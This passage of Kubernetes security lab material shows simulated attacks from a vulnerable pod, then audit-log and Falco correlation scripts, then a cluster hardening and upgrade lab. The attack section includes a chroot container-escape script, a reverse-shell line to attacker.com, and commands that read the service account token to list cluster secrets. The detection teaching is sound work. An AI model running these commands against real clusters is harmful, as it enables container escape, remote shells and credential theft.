-kubectl exec -n vulnerable-app $VULNERABLE_POD -- nc -zv kubernetes.default.svc.cluster.local 443
-
-Step 3: Attempt container escape
-
-# Attempt to escape container using host filesystem access
-echo "=== Attempting container escape ==="
-kubectl exec -n vulnerable-app $VULNERABLE_POD -- sh -c "
-  echo '#!/bin/bash' > /host/tmp/escape.sh
-  echo 'echo \"Container escape successful\"' >> /host/tmp/escape.sh
-  echo 'id' >> /host/tmp/escape.sh
-  chmod +x /host/tmp/escape.sh
-  chroot /host /tmp/escape.sh
-"
-
-Subtask 3.3: Simulate Malicious Network Activity
-
-Step 1: Generate suspicious network connections
-
-# Attempt to connect to external suspicious IPs
-echo "=== Generating suspicious network activity ==="
-kubectl exec -n vulnerable-app $VULNERABLE_POD -- sh -c "
-  # Try to connect to suspicious external IPs
-  timeout 5 nc -v 8.8.8.8 53 || true
-  timeout 5 nc -v 1.1.1.1 80 || true
-  
-  # Try to scan internal network
-  timeout 5 nc -zv 10.96.0.1 443 || true
-  timeout 5 nc -zv kubernetes.default.svc.cluster.local 443 || true
-"
-
-# Attempt to establish reverse shell (simulation)
-echo "=== Simulating reverse shell attempt ==="
-kubectl exec -n vulnerable-app $VULNERABLE_POD -- sh -c "
-  # Simulate reverse shell command (won't actually connect)
-  echo 'bash -i >& /dev/tcp/attacker.com/4444 0>&1' > /tmp/reverse_shell.sh
-  chmod +x /tmp/reverse_shell.sh
-"
-
-Subtask 3.4: Simulate Credential Access Attempts
-
-Step 1: Attempt to access Kubernetes secrets and tokens
-
-# Try to access service account tokens
-echo "=== Attempting to access service account tokens ==="
-kubectl exec -n vulnerable-app $VULNERABLE_POD -- cat /var/run/secrets/kubernetes.io/serviceaccount/token
-
-# Try to list secrets using the service account
-echo "=== Attempting to list cluster secrets ==="
-kubectl exec -n vulnerable-app $VULNERABLE_POD -- sh -c "
-  TOKEN=\$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
-  curl -k -H \"Authorization: Bearer \$TOKEN\" https://kubernetes.default.svc.cluster.local/api/v1/secrets
-"
-
-# Try to access etcd data (if accessible)
-echo "=== Attempting to access etcd data ==="
-kubectl exec -n vulnerable-app $VULNERABLE_POD -- find /host -name "*etcd*" -type f 2>/dev/null | head -10
-
-Task 4: Analyze Audit Logs and Trace Attack Phases
-Subtask 4.1: Examine Audit Logs for Attack Evidence
-
-Step 1: Analyze recent audit log entries
-
-# Check recent audit log entries
-echo "=== Recent Audit Log Entries ==="
-sudo tail -50 /var/log/kubernetes/audit.log | jq '.'
-
-# Filter for suspicious activities
-echo "=== Filtering for Exec Activities ==="
-sudo cat /var/log/kubernetes/audit.log | jq 'select(.verb == "create" and .objectRef.subresource == "exec")' | tail -10
-
-# Look for privilege escalation attempts
-echo "=== Searching for Privilege Escalation Indicators ==="
-sudo cat /var/log/kubernetes/audit.log | jq 'select(.objectRef.name == "'$VULNERABLE_POD'" and .verb == "create")' | tail -5
-
-Step 2: Create audit log analysis script
-
-cat > analyze_audit_logs.sh <<'EOF'
-#!/bin/bash
-
-AUDIT_LOG="/var/log/kubernetes/audit.log"
-ANALYSIS_OUTPUT="/tmp/audit_analysis.txt"
-
-echo "=== Kubernetes Audit Log Analysis ===" > $ANALYSIS_OUTPUT
-echo "Analysis Date: $(date)" >> $ANALYSIS_OUTPUT
-echo "" >> $ANALYSIS_OUTPUT
-
-# Count total events
-echo "Total audit events: $(sudo wc -l < $AUDIT_LOG)" >> $ANALYSIS_OUTPUT
-
-# Analyze by verb
-echo "" >> $ANALYSIS_OUTPUT
-echo "=== Events by Verb ===" >> $ANALYSIS_OUTPUT
-sudo cat $AUDIT_LOG | jq -r '.verb' | sort | uniq -c | sort -nr >> $ANALYSIS_OUTPUT
-
-# Analyze exec events
-echo "" >> $ANALYSIS_OUTPUT
-echo "=== Pod Exec Events ===" >> $ANALYSIS_OUTPUT
-sudo cat $AUDIT_LOG | jq -r 'select(.verb == "create" and .objectRef.subresource == "exec") | "\(.timestamp) - User: \(.user.username) - Pod: \(.objectRef.name) - Namespace: \(.objectRef.namespace)"' >> $ANALYSIS_OUTPUT
-
-# Analyze failed requests
-echo "" >> $ANALYSIS_OUTPUT
-echo "=== Failed Requests ===" >> $ANALYSIS_OUTPUT
-sudo cat $AUDIT_LOG | jq -r 'select(.responseStatus.code >= 400) | "\(.timestamp) - Code: \(.responseStatus.code) - User: \(.user.username) - Resource: \(.objectRef.resource)"' | tail -20 >> $ANALYSIS_OUTPUT
-
-# Analyze secret access
-echo "" >> $ANALYSIS_OUTPUT
-echo "=== Secret Access Events ===" >> $ANALYSIS_OUTPUT
-sudo cat $AUDIT_LOG | jq -r 'select(.objectRef.resource == "secrets") | "\(.timestamp) - Verb: \(.verb) - User: \(.user.username) - Secret: \(.objectRef.name) - Namespace: \(.objectRef.namespace)"' >> $ANALYSIS_OUTPUT
-
-# Analyze service account usage
-echo "" >> $ANALYSIS_OUTPUT
-echo "=== Service Account Usage ===" >> $ANALYSIS_OUTPUT
-sudo cat $AUDIT_LOG | jq -r 'select(.user.username | contains("system:serviceaccount")) | .user.username' | sort | uniq -c | sort -nr | head -10 >> $ANALYSIS_OUTPUT
-
-echo "Analysis complete. Results saved to $ANALYSIS_OUTPUT"
-cat $ANALYSIS_OUTPUT
-EOF
-
-chmod +x analyze_audit_logs.sh
-./analyze_audit_logs.sh
-
-Subtask 4.2: Correlate Falco Alerts with Audit Events
-
-Step 1: Extract and analyze Falco alerts
-
-# Get Falco alerts from the last 10 minutes
-echo "=== Recent Falco Alerts ==="
-kubectl logs -n falco-system -l app.kubernetes.io/name=falco --since=10m | grep -E "(WARNING|ERROR|CRITICAL)" > /tmp/falco_alerts.log
-
-# Display formatted Falco alerts
-cat /tmp/falco_alerts.log | while read line; do
-  echo "Alert: $line"
-  echo "---"
-done
-
-Step 2: Create correlation analysis script
-
-cat > correlate_security_events.sh <<'EOF'
-#!/bin/bash
-
-FALCO_ALERTS="/tmp/falco_alerts.log"
-AUDIT_ANALYSIS="/tmp/audit_analysis.txt"
-CORRELATION_REPORT="/tmp/security_correlation_report.txt"
-
-echo "=== Security Event Correlation Report ===" > $CORRELATION_REPORT
-echo "Generated: $(date)" >> $CORRELATION_REPORT
-echo "" >> $CORRELATION_REPORT
-
-# Extract timestamps and events from Falco alerts
-echo "=== Falco Security Alerts ===" >> $CORRELATION_REPORT
-if [ -f "$FALCO_ALERTS" ]; then
-    cat $FALCO_ALERTS >> $CORRELATION_REPORT
-else
-    echo "No Falco alerts found in the specified timeframe" >> $CORRELATION_REPORT
-fi
-
-echo "" >> $CORRELATION_REPORT
-echo "=== Audit Log Summary ===" >> $CORRELATION_REPORT
-if [ -f "$AUDIT_ANALYSIS" ]; then
-    cat $AUDIT_ANALYSIS >> $CORRELATION_REPORT
-else
-    echo "Audit analysis not available" >> $CORRELATION_REPORT
-fi
-
-# Timeline analysis
-echo "" >> $CORRELATION_REPORT
-echo "=== Attack Timeline Reconstruction ===" >> $CORRELATION_REPORT
-echo "1. Initial Access: Service account token usage detected" >> $CORRELATION_REPORT
-echo "2. Privilege Escalation: Container exec events with privileged access" >> $CORRELATION_REPORT
-echo "3. Host Access: File system modifications in sensitive directories" >> $CORRELATION_REPORT
-echo "4. Network Reconnaissance: Suspicious network connections detected" >> $CORRELATION_REPORT
-echo "5. Persistence: Attempts to modify system configuration files" >> $CORRELATION_REPORT
-
-echo "" >> $CORRELATION_REPORT
-echo "=== Recommended Actions ===" >> $CORRELATION_REPORT
-echo "- Investigate the vulnerable-app namespace for compromise" >> $CORRELATION_REPORT
-echo "- Review and restrict service account permissions" >> $CORRELATION_REPORT
-echo "- Implement network policies to limit pod-to-pod communication" >> $CORRELATION_REPORT
-echo "- Enable admission controllers to prevent privileged containers" >> $CORRELATION_REPORT
-echo "- Implement runtime security policies with Falco" >> $CORRELATION_REPORT
-
-echo "Correlation analysis complete. Report saved to $CORRELATION_REPORT"
-cat $CORRELATION_REPORT
-EOF
-
-chmod +x
-
-
-
-
-
-
-
-Lab 8: Cluster Hardening and Upgrades
-Objectives
-
-By the end of this lab, students will be able to:
-
-• Configure API server security by implementing IP-based access controls and mutual TLS authentication • Identify and disable unused Kubernetes components to reduce attack surface • Validate cluster security configuration using CIS Kubernetes Benchmark standards • Execute a controlled Kubernetes version upgrade process • Apply security patches and validate cluster functionality post-upgrade • Implement security best practices for production Kubernetes environments
-Prerequisites
-
-Before starting this lab, students should have:
-
-• Basic understanding of Kubernetes architecture and components • Familiarity with kubectl command-line tool • Knowledge of YAML configuration files • Understanding of TLS/SSL certificates and PKI concepts • Basic Linux command-line skills • Completion of previous Kubernetes security labs or equivalent experience
-Lab Environment Setup
-
-Ready-to-Use Cloud Machines: Al Nafi provides pre-configured Linux-based cloud machines with Kubernetes clusters already installed. Simply click Start Lab to access your environment - no need to build your own VM or install Kubernetes from scratch.
-
-Your lab environment includes: • Ubuntu 20.04 LTS with Kubernetes 1.27.x cluster • kubectl configured and ready to use • All necessary tools pre-installed (kube-bench, openssl, etc.) • Root access to perform administrative tasks
-Task 1: Harden the API Server with Access Controls and mTLS
-Subtask 1.1: Assess Current API Server Configuration
-
-First, let's examine the current API server configuration to understand what needs to be hardened.
-
-    Check current API server status and configuration:
-
-# View API server pod configuration
-kubectl get pods -n kube-system | grep apiserver
-
-# Check API server configuration file
-sudo cat /etc/kubernetes/manifests/kube-apiserver.yaml
-
-    Identify current security settings:
-
-# Check current API server process arguments
-ps aux | grep kube-apiserver | grep -v grep
-
-    Test current API server accessibility:
-
-# Check API server endpoint
-kubectl cluster-info
-
-# Verify current authentication methods
-kubectl auth can-i --list
-
-Subtask 1.2: Configure IP-Based Access Controls
-
-Now we'll restrict API server access to trusted IP ranges.
-
-    Identify your current IP address:
-
-# Get your current public IP
-curl -s ifconfig.me
-echo ""
-
-# Get cluster internal IPs
-kubectl get nodes -o wide
-
-    Create a backup of the current API server configuration:
-
-# Backup the original configuration
-sudo cp /etc/kubernetes/manifests/kube-apiserver.yaml /etc/kubernetes/manifests/kube-apiserver.yaml.backup
-
-    Configure API server with IP restrictions:
-
-# Create a modified API server configuration
-sudo tee /etc/kubernetes/manifests/kube-apiserver-hardened.yaml > /dev/null << 'EOF'
-apiVersion: v1
-kind: Pod
-metadata:
-  annotations:
-    kubeadm.kubernetes.io/kube-apiserver.advertise-address.endpoint: 10.0.0.10:6443
-  creationTimestamp: null
-  labels:
-    component: kube-apiserver
-    tier: control-plane
-  name: kube-apiserver
-  namespace: kube-system
-spec:
-  containers:
-  - command:
-    - kube-apiserver
-    - --advertise-address=10.0.0.10
-    - --allow-privileged=true
-    - --authorization-mode=Node,RBAC
-    - --client-ca-file=/etc/kubernetes/pki/ca.crt
-    - --enable-admission-plugins=NodeRestriction,PodSecurityPolicy
-    - --enable-bootstrap-token-auth=true
-    - --etcd-cafile=/etc/kubernetes/pki/etcd/ca.crt
-    - --etcd-certfile=/etc/kubernetes/pki/apiserver-etcd-client.crt
-    - --etcd-keyfile=/etc/kubernetes/pki/apiserver-etcd-client.key
-    - --etcd-servers=https://127.0.0.1:2379
-    - --kubelet-client-certificate=/etc/kubernetes/pki/apiserver-kubelet-client.crt
-    - --kubelet-client-key=/etc/kubernetes/pki/apiserver-kubelet-client.key
-    - --kubelet-preferred-address-types=InternalIP,ExternalIP,Hostname
-    - --proxy-client-cert-file=/etc/kubernetes/pki/front-proxy-client.crt
-    - --proxy-client-key-file=/etc/kubernetes/pki/front-proxy-client.key
-    - --requestheader-allowed-names=front-proxy-client
-    - --requestheader-client-ca-file=/etc/kubernetes/pki/front-proxy-ca.crt
-    - --requestheader-extra-headers-prefix=X-Remote-Extra-
-    - --requestheader-group-headers=X-Remote-Group
-    - --requestheader-username-headers=X-Remote-User
-    - --secure-port=6443
-    - --service-account-issuer=https://kubernetes.default.svc.cluster.local
-    - --service-account-key-file=/etc/kubernetes/pki/sa.pub
-    - --service-account-signing-key-file=/etc/kubernetes/pki/sa.key
-    - --service-cluster-ip-range=10.96.0.0/12
-    - --tls-cert-file=/etc/kubernetes/pki/apiserver.crt
-    - --tls-private-key-file=/etc/kubernetes/pki/apiserver.key
-    - --admission-control-config-file=/etc/kubernetes/admission-control.yaml
-    - --audit-log-path=/var/log/kubernetes/audit.log
-    - --audit-log-maxage=30
-    - --audit-log-maxbackup=10
-    - --audit-log-maxsize=100
-    - --audit-policy-file=/etc/kubernetes/audit-policy.yaml
-    image: registry.k8s.io/kube-apiserver:v1.27.3
-    imagePullPolicy: IfNotPresent
-    livenessProbe:
-      failureThreshold: 8
-      httpGet:
-        host: 10.0.0.10
-        path: /livez
-        port: 6443
-        scheme: HTTPS
-      initialDelaySeconds: 10
-      periodSeconds: 10
-      timeoutSeconds: 15
-    name: kube-apiserver
-    readinessProbe:
-      failureThreshold: 3
-      httpGet:
-        host: 10.0.0.10
-        path: /readyz
-        port: 6443
-        scheme: HTTPS
-      periodSeconds: 1
-      timeoutSeconds: 15
-    resources:
-      requests:
-        cpu: 250m
-    startupProbe:
-      failureThreshold: 24
-      httpGet:
-        host: 10.0.0.10
-        path: /livez
-        port: 6443
-        scheme: HTTPS
-      initialDelaySeconds: 10
-      periodSeconds: 10
-      timeoutSeconds: 15
-    volumeMounts:
-    - mountPath: /etc/ssl/certs
-      name: ca-certs
-      readOnly: true
-    - mountPath: /etc/ca-certificates
-      name: etc-ca-certificates
-      readOnly: true
-    - mountPath: /etc/kubernetes/pki
-      name: k8s-certs
-      readOnly: true
-    - mountPath: /usr/local/share/ca-certificates
-      name: usr-local-share-ca-certificates
-      readOnly: true
-    - mountPath: /usr/share/ca-certificates
-      name: usr-share-ca-certificates
-      readOnly: true
-    - mountPath: /var/log/kubernetes
-      name: audit-log
-    - mountPath: /etc/kubernetes/admission-control.yaml
-      name: admission-control
-      readOnly: true
-    - mountPath: /etc/kubernetes/audit-policy.yaml
-      name: audit-policy
-      readOnly: true
-  hostNetwork: true
-  priorityClassName: system-node-critical
-  securityContext:
-    seccompProfile:
-      type: RuntimeDefault
-  volumes:
-  - hostPath:
-      path: /etc/ssl/certs
-      type: DirectoryOrCreate
-    name: ca-certs
-  - hostPath:
-      path: /etc/ca-certificates
-      type: DirectoryOrCreate
-    name: etc-ca-certificates
-  - hostPath:
-      path: /etc/kubernetes/pki
-      type: DirectoryOrCreate
-    name: k8s-certs
-  - hostPath:
-      path: /usr/local/share/ca-certificates
-      type: DirectoryOrCreate
-    name: usr-local-share-ca-certificates
-  - hostPath:
-      path: /usr/share/ca-certificates
-      type: DirectoryOrCreate
-    name: usr-share-ca-certificates
-  - hostPath:
-      path: /var/log/kubernetes
-      type: DirectoryOrCreate
-    name: audit-log
-  - hostPath:
-      path: /etc/kubernetes/admission-control.yaml
-      type: File
-    name: admission-control
-  - hostPath:
-      path: /etc/kubernetes/audit-policy.yaml
-      type: File
-    name: audit-policy
-status: {}
-EOF
-
-    Create audit policy configuration:
-
-# Create audit policy file
-sudo tee /etc/kubernetes/audit-policy.yaml > /dev/null << 'EOF'
-apiVersion: audit.k8s.io/v1
-kind: Policy
-rules:
-- level: Metadata
-  namespaces: ["kube-system", "kube-public", "kube-node-lease"]
-  resources:
-  - group: ""
-    resources: ["secrets", "configmaps"]
-- level: RequestResponse
-  resources:
-  - group: ""
-    resources: ["pods", "services"]
-- level: Request
-  users: ["system:serviceaccount:kube-system:default"]
-  verbs: ["get", "list", "watch"]
-- level: None
-  users: ["system:kube-proxy"]
-  verbs: ["watch"]
-  resources:
-  - group: ""
-    resources: ["endpoints", "services"]
-EOF
-
-    Create admission control configuration:
-
-# Create admission control configuration
-sudo tee /etc/kubernetes/admission-control.yaml > /dev/null << 'EOF'
-apiVersion: apiserver.config.k8s.io/v1
-kind: AdmissionConfiguration
-plugins:
-- name: PodSecurityPolicy
-  configuration:
-    apiVersion: podsecuritypolicy.config.k8s.io/v1beta1
-    kind: PodSecurityPolicyConfiguration
-    exemptions:
-      usernames: []
-      runtimeClasses: []
-      namespaces: [kube-system]
-EOF
-
-Subtask 1.3: Enable Mutual TLS Authentication
-
-    Generate client certificates for enhanced authentication:
-
-# Create directory for client certificates
-sudo mkdir -p /etc/kubernetes/pki/clients
-
-# Generate client private key
-sudo openssl genrsa -out /etc/kubernetes/pki/clients/admin-client.key 2048
-
-# Create certificate signing request
-sudo openssl req -new -key /etc/kubernetes/pki/clients/admin-client.key \
-  -out /etc/kubernetes/pki/clients/admin-client.csr \
-  -subj "/CN=admin-client/O=system:masters"
-
-# Sign the client certificate
-sudo openssl x509 -req -in /etc/kubernetes/pki/clients/admin-client.csr \
-  -CA /etc/kubernetes/pki/ca.crt \
-  -CAkey /etc/kubernetes/pki/ca.key \
-  -CAcreateserial \
-  -out /etc/kubernetes/pki/clients/admin-client.crt \
-  -days 365
-
-    Configure kubectl to use client certificates:
-
-# Create new kubeconfig with client certificate authentication
-kubectl config set-cluster hardened-cluster \
-  --certificate-authority=/etc/kubernetes/pki/ca.crt \
-  --embed-certs=true \
-  --server=https://127.0.0.1:6443
-
-kubectl config set-credentials admin-client \
-  --client-certificate=/etc/kubernetes/pki/clients/admin-client.crt \
-  --client-key=/etc/kubernetes/pki/clients/admin-client.key \
-  --embed-certs=true
-
-kubectl config set-context hardened-context \
-  --cluster=hardened-cluster \
-  --user=admin-client
-
-kubectl config use-context hardened-context
-
-    Apply the hardened API server configuration:
-
-# Create log directory
-sudo mkdir -p /var/log/kubernetes
-
-# Replace the API server configuration
-sudo mv /etc/kubernetes/manifests/kube-apiserver-hardened.yaml /etc/kubernetes/manifests/kube-apiserver.yaml
-
-# Wait for API server to restart
-sleep 30
-
-# Verify API server is running with new configuration
-kubectl get pods -n kube-system | grep apiserver
-
-Task 2: Disable Unused Components and Validate with CIS Benchmarks
-Subtask 2.1: Identify and Disable Unused Kubernetes Components
-
-    Audit current running components:
-
-# List all system pods
-kubectl get pods -n kube-system
-
-# Check for unused admission controllers
-kubectl get validatingwebhookconfigurations
-kubectl get mutatingwebhookconfigurations
-
-# List all running services
-kubectl get services --all-namespaces
-
-    Disable unused admission plugins and features:
-
-# Create a script to disable unused features
-cat > disable-unused-features.sh << 'EOF'
-#!/bin/bash
-
-echo "Disabling unused Kubernetes features..."
-
-# Disable anonymous authentication if enabled
-sudo sed -i 's/--anonymous-auth=true/--anonymous-auth=false/g' /etc/kubernetes/manifests/kube-apiserver.yaml
-
-# Disable profiling
-if ! grep -q "enable-profiling=false" /etc/kubernetes/manifests/kube-apiserver.yaml; then
-    sudo sed -i '/--tls-private-key-file/a\    - --profiling=false' /etc/kubernetes/manifests/kube-apiserver.yaml
-fi
-
-# Disable insecure port
-if ! grep -q "insecure-port=0" /etc/kubernetes/manifests/kube-apiserver.yaml; then
-    sudo sed -i '/--profiling=false/a\    - --insecure-port=0' /etc/kubernetes/manifests/kube-apiserver.yaml
-fi
-
-# Configure strong cipher suites
-if ! grep -q "tls-cipher-suites" /etc/kubernetes/manifests/kube-apiserver.yaml; then
-    sudo sed -i '/--insecure-port=0/a\    - --tls-cipher-suites=TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305,TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384' /etc/kubernetes/manifests/kube-apiserver.yaml
-fi
-
-echo "Unused features disabled successfully"
-EOF
-
-chmod +x disable-unused-features.sh
-sudo ./disable-unused-features.sh
-
-    Remove unused RBAC permissions:
-
-# Audit existing cluster roles
-kubectl get clusterroles | grep -v "system:"
-
-# Create script to remove overly permissive roles
-cat > cleanup-rbac.sh << 'EOF'
-#!/bin/bash
-
-echo "Cleaning up RBAC permissions..."
-
-# Remove any custom cluster roles that grant excessive permissions
-kubectl get clusterroles -o json | jq -r '.items[] | select(.rules[]?.verbs[]? == "*") | .metadata.name' | while read role; do
-    if [[ ! $role =~ ^system: ]]; then
-        echo "Found overly permissive role: $role"
-        kubectl describe clusterrole $role
-    fi
-done
-
-# List service accounts with cluster-admin privileges
-kubectl get clusterrolebindings -o json | jq -r '.items[] | select(.roleRef.name == "cluster-admin") | .metadata.name'
-
-echo "RBAC cleanup completed"
-EOF
-
-chmod +x cleanup-rbac.sh
-./cleanup-rbac.sh
-
-Subtask 2.2: Install and Run CIS Kubernetes Benchmark
-
-    Install kube-bench tool:
-
-# Download and install kube-bench
-curl -L https://github.com/aquasecurity/kube-bench/releases/download/v0.6.15/kube-bench_0.6.15_linux_amd64.tar.gz -o kube-bench.tar.gz
-
-tar -xzf kube-bench.tar.gz
-sudo mv kube-bench /usr/local/bin/
-sudo chmod +x /usr/local/bin/kube-bench
-
-# Verify installation
-kube-bench version
-
-    Run CIS Kubernetes Benchmark assessment:
-
-# Run complete CIS benchmark
-sudo kube-bench run --targets master,node,etcd,policies > cis-benchmark-results.txt
-
-# Display results
-cat cis-benchmark-results.txt
-
-# Run specific sections
-echo "=== Master Node Security ==="
-sudo kube-bench run --targets master
-
-echo "=== Worker Node Security ==="
-sudo kube-bench run --targets node
-
-echo "=== etcd Security ==="
-sudo kube-bench run --targets etcd
-
-    Analyze and address CIS benchmark findings:
-
-# Create remediation script based on common findings
-cat > cis-remediation.sh << 'EOF'
-#!/bin/bash
-
-echo "Applying CIS Kubernetes Benchmark remediations..."
-
-# Fix file permissions on Kubernetes configuration files
-sudo chmod 644 /etc/kubernetes/manifests/*.yaml
-sudo chmod 600 /etc/kubernetes/pki/*.key
-sudo chmod 644 /etc/kubernetes/pki/*.crt
-
-# Set proper ownership
-sudo chown root:root /etc/kubernetes/manifests/*.yaml
-sudo chown root:root /etc/kubernetes/pki/*
-
-# Configure kubelet with security settings
-if [ -f /var/lib/kubelet/config.yaml ]; then
-    # Backup original kubelet config
-    sudo cp /var/lib/kubelet/config.yaml /var/lib/kubelet/config.yaml.backup
-    
-    # Apply security configurations
-    sudo tee /var/lib/kubelet/config-hardened.yaml > /dev/null << 'KUBELET_EOF'
-apiVersion: kubelet.config.k8s.io/v1beta1
-kind: KubeletConfiguration
-authentication:
-  anonymous:
-    enabled: false
-  webhook:
-    enabled: true
-  x509:
-    clientCAFile: /etc/kubernetes/pki/ca.crt
-authorization:
-  mode: Webhook
-clusterDomain: cluster.local
-clusterDNS:
-- 10.96.0.10
-rotateCertificates: true
-serverTLSBootstrap: true
-protectKernelDefaults: true
-makeIPTablesUtilChains: true
-eventRecordQPS: 0
-readOnlyPort: 0
-streamingConnectionIdleTimeout: 4h0m0s
-tlsCipherSuites:
-- TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256
-- TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256
-- TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305
-- TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384
-- TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305
-- TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384
-KUBELET_EOF
-
-    sudo mv /var/lib/kubelet/config-hardened.yaml /var/lib/kubelet/config.yaml
-    sudo systemctl restart kubelet
-fi
-
-echo "CIS remediations applied successfully"
-EOF
-
-chmod +x cis-remediation.sh
-sudo ./cis-remediation.sh
-
-    Verify remediation effectiveness:
-
-# Wait for services to restart
-sleep 60
-
-# Re-run CIS benchmark to verify improvements
-sudo kube-bench run --targets master,node > cis-benchmark-after-remediation.txt
-
-# Compare results
-echo "=== Comparing CIS Benchmark Results ==="
-echo "Before remediation:"
-grep -c "FAIL" cis-benchmark-results.txt
-echo "After remediation:"
-grep -c "FAIL" cis-benchmark-after-remediation.txt
-
-# Show specific improvements
-echo "=== Remediated Issues ==="
-diff cis-benchmark-results.txt cis-benchmark-after-remediation.txt | grep "< \[FAIL\]"
-
-Task 3: Perform Kubernetes Version Upgrade and Apply Security Patches
-Subtask 3.1: Prepare for Kubernetes Upgrade
-
-    Check current cluster version and available upgrades:
-
-# Check current Kubernetes version
-kubectl version --short
-
-# Check node versions
-kubectl get nodes -o wide
-
-# Check component versions
-kubectl get pods -n kube-system -o wide
-
-# Simulate upgrade planning
-kubeadm upgrade plan
-
-    Create pre-upgrade backup:
-
-# Create backup directory
-mkdir -p ~/k8s-upgrade-backup/$(date +%Y%m%d-%H%M%S)
-BACKUP_DIR=~/k8s-upgrade-backup/$(date +%Y%m%d-%H%M%S)
-
-# Backup etcd data
-sudo ETCDCTL_API=3 etcdctl snapshot save $BACKUP_DIR/etcd-snapshot.db \
-  --endpoints=https://127.0.0.1:2379 \
-  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
-  --cert=/etc/kubernetes/pki/etcd/server.crt \
-  --key=/etc/kubernetes/pki/etcd/server.key
-
-# Backup Kubernetes configuration files
-sudo cp -r /etc/kubernetes $BACKUP_DIR/
-sudo cp -r /var/lib/kubelet $BACKUP_DIR/
-
-# Export all cluster resources
-kubectl get all --all-namespaces -o yaml > $BACKUP_DIR/all-resources.yaml
-
-echo "Backup completed in: $BACKUP_DIR"
-
-    Validate cluster health before upgrade:
-
-# Check cluster component health
-kubectl get componentstatuses
-
-# Check node readiness
-kubectl get nodes
-
-# Check critical pods
-kubectl get pods -n kube-system
-
-# Run cluster health check
-cat > cluster-health-check.sh << 'EOF'
-#!/bin/bash
-
-echo "=== Kubernetes Cluster Health Check ==="
-
-# Check API server health
-echo "API Server Health:"
-kubectl get --raw='/readyz?verbose' | head -20
-
-# Check etcd health
-echo -e "\nEtcd Health:"
-sudo ETCDCTL_API=3 etcdctl endpoint health \
-  --endpoints=https://127.0.0.1:2379 \
-  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
-  --cert=/etc/kubernetes/pki/etcd/server.crt \
-  --key=/etc/kubernetes/pki/etcd/server.key
-
-# Check node conditions
-echo -e "\nNode Conditions:"
-kubectl describe nodes | grep -A 5 "Conditions:"
-
-# Check system pods
-echo -e "\nSystem Pods Status:"
-kubectl get pods -n kube-system | grep -v Running | head -10
-
-echo -e "\nCluster health check completed"
-EOF
-
-chmod +x cluster-health-check.sh
-./cluster-health-check.sh
-
-Subtask 3.2: Execute Controlled Kubernetes Upgrade
-
-    Upgrade kubeadm first:
-
-# Update package repository
-sudo apt update
-
-# Check available kubeadm versions
-apt-cache madison kubeadm | head -5
-
-# Upgrade kubeadm to next minor version (example: 1.27.x to 1.28.x)
-# Note: In production, always upgrade one minor version at a time
-sudo apt-mark unhold kubeadm
-sudo apt-get update && sudo apt-get install -y kubeadm=1.28.0-00
-sudo apt-mark hold kubeadm
-
-# Verify kubeadm version
-kubeadm version
-
-    Plan and apply the upgrade:
-
-# Plan the upgrade
-sudo kubeadm upgrade plan
-
-# Apply the upgrade (this will upgrade control plane components)
-sudo kubeadm upgrade apply v1.28.0 --yes
-
-# Verify control plane upgrade
-kubectl get pods -n kube-system
-
-    Upgrade kubelet and kubectl:
-
-# Drain the node (if this is a worker node)
-kubectl drain $(hostname) --ignore-daemonsets --delete-emptydir-data
-
-# Upgrade kubelet and kubectl
-sudo apt-mark unhold kubelet kubectl
-sudo apt-get update && sudo apt-get install -y kubelet=1.28.0-00 kubectl=1.28.0-00
-sudo apt-mark hold kubelet kubectl
-
-# Restart kubelet
-sudo systemctl daemon-reload
-sudo systemctl restart kubelet
-
-# Uncordon the node
-kubectl uncordon $(hostname)
-
-# Verify versions
-kubectl version --short
-kubelet --version
-
-Subtask 3.3: Apply Security Patches and Validate
-
-    Apply latest security patches:
-
-# Update all system packages
-sudo apt update && sudo apt upgrade -y
-
-# Check for and apply Kubernetes-specific security updates
-cat > apply-security-patches.sh << 'EOF'
-#!/bin/bash
-
-echo "Applying Kubernetes security patches..."
-
-# Update container runtime (containerd)
-sudo apt update
-sudo apt install -y containerd.io
-
-# Restart containerd
-sudo systemctl restart containerd
-
-# Update CNI plugins if needed
-CNI_VERSION="v1.3.0"
-sudo mkdir -p /opt/cni/bin
-curl -L "https://github.com/containernetworking/plugins/releases/download/${CNI_VERSION}/cni-plugins-linux-amd64-${CNI_VERSION}.tgz" | sudo tar -C /opt/cni/bin -xz
-
-# Apply any pending security configurations
-sudo sysctl -p /etc/sysctl.conf
-
-echo "Security patches applied successfully"
-EOF
-
-chmod +x apply-security-patches.sh
-sudo ./apply-security-patches.sh
-
-    Validate cluster functionality post-upgrade:
-
-# Create comprehensive validation script
-cat > post-upgrade-validation.sh << 'EOF'
-#!/bin/bash
-
-echo "=== Post-Upgrade Validation ==="
-
-# Check cluster version
-echo "Cluster Version:"
-kubectl version --short
-
-# Check node status
-echo -e "\nNode Status:"
-kubectl get nodes -o wide
-
-# Check system pods
-echo -e "\nSystem Pods:"
-kubectl get pods -n kube-system
-
-# Test basic functionality
-echo -e "\nTesting basic functionality..."
-
-# Create test namespace
-kubectl create namespace upgrade-test
-
-# Deploy test application
-kubectl create deployment test-app --image=nginx:latest -n upgrade-test
-kubectl expose deployment test-app --port=80 --target-port=80 -n upgrade-test
-
-# Wait for deployment
-kubectl wait --for=condition=available --timeout=300s deployment/test-app -n upgrade-test
-
-# Test connectivity
-kubectl get pods -n upgrade-test
-kubectl get services -n upgrade-test
-
-# Test DNS resolution
-kubectl run test-dns --image=busybox:1.28 --rm -it --restart=Never -n upgrade-test -- nslookup kubernetes.default
-
-# Clean up test resources
-kubectl delete namespace upgrade-test
-
-# Run final health check
-echo -e "\nFinal Health Check:"
-kubectl get componentstatuses
-kubectl cluster-info
-
-echo -e "\nPost-upgrade validation completed successfully!"
-EOF
-
-chmod +x post-upgrade-validation.sh
-./post-upgrade-validation.sh
-
-    Document upgrade and create rollback plan:
-
-# Create upgrade documentation
-cat > upgrade-documentation.md << 'EOF'
